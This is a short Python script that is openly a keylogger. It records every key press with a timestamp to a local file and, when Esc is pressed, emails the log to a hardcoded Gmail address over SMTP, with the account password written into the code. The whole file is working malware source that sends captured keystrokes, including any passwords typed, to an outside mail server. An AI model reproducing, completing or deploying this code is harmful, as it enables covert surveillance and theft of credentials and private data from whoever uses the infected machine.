import keyboard
import datetime
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

log_file = "keylog.txt"
gmail_user = "bcaiadc@gmail.com"
gmail_password = "qwerty@123"
to = "bcaiadc@gmail.com"

def send_email():
    msg = MIMEMultipart()
    msg['From'] = gmail_user
    msg['To'] = to
    msg['Subject'] = "Keylogger Log File"
    with open(log_file, "rb") as f:
        attachment = MIMEApplication(f.read(), _subtype="txt")
        attachment.add_header('Content-Disposition', 'attachment', filename=log_file)
        msg.attach(attachment)
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(gmail_user, gmail_password)
    server.sendmail(gmail_user, to, msg.as_string())
    server.quit()

def on_press(event):
    with open(log_file, "a") as f:
        f.write(f"{event.name} - {datetime.datetime.now()}\n")
    if event.event_type == "down" and event.name == "esc":
        send_email()

keyboard.on_press(on_press)

keyboard.wait()